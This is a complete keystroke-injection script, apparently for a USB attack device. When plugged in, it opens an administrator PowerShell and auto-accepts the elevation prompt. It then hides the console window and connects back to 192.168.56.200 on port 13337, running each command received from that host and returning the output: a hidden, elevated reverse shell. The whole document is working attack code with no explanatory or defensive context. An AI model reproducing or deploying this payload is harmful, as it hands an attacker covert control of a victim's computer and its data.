DELAY 3000
REM Open PowerShell as Administrator
CONTROL ESCAPE
STRING_DELAY 5
DELAY 1000
STRING powershell
STRING_DELAY 5
DELAY 500
CTRL-SHIFT ENTER
STRING_DELAY 5
DELAY 2000
ALT Y
STRING_DELAY 5
DELAY 5000

REM Define a function to hide the console window using Windows API
STRING Add-Type @"
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING using System;
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING using System.Runtime.InteropServices;
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING public class ConsoleWindow {
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING [DllImport("kernel32.dll")]
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING public static extern IntPtr GetConsoleWindow();
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING [DllImport("user32.dll")]
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING public static void Hide() {
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING var handle = GetConsoleWindow();
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING ShowWindow(handle, 0); // 0 = SW_HIDE
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING }
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING }
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING "@
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100

REM Persistent runspace setup
STRING $runspace = [runspacefactory]::CreateRunspace()
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $runspace.Open()
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100

REM Loop to attempt connection
STRING "Attempting to connect to TCP server..."
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING do {
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING try {
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $TCPClient = New-Object Net.Sockets.TCPClient('192.168.56.200', 13337)
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING Write-Host "Connected to TCP server."
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING } catch {
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING Write-Host "Failed to connect, retrying..."
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING }
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING Start-Sleep -Seconds 1
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING } while (-not $TCPClient.Connected)
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100

REM Setup streams
STRING $NetworkStream = $TCPClient.GetStream()
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $StreamReader = New-Object IO.StreamReader($NetworkStream)
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100

REM Initial command prompt
STRING $StreamWriter.WriteLine('SHELL> ')
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $StreamWriter.Flush()
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100

REM Hide the console window before entering the main loop
STRING [ConsoleWindow]::Hide()
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 1000

REM Main command loop
STRING while ($true) {
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $Command = $StreamReader.ReadLine()
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING if ($Command -eq 'exit') {
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING break
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING }
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100

REM Execute the command
STRING $pipeline = [powershell]::Create().AddScript($Command).AddCommand("Out-String")
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $pipeline.Runspace = $runspace
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $Result = $pipeline.Invoke()
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100

REM Get the output
STRING $Output = $Result | Out-String
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100

REM Check for errors
STRING if ($pipeline.Streams.Error.Count -gt 0) {
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $Output = $pipeline.Streams.Error | Select -ExpandProperty ToString | Out-String
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING }
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100

REM Write output back to the stream
STRING $StreamWriter.Write($Output)
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $StreamWriter.WriteLine('SHELL> ')
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $StreamWriter.Flush()
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING }
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100

REM Cleanup
STRING $StreamWriter.Close()
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $TCPClient.Close()
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100
STRING $runspace.Close()
STRING_DELAY 5
ENTER
STRING_DELAY 5
DELAY 100

REM End of script
STRING exit
STRING_DELAY 5
ENTER
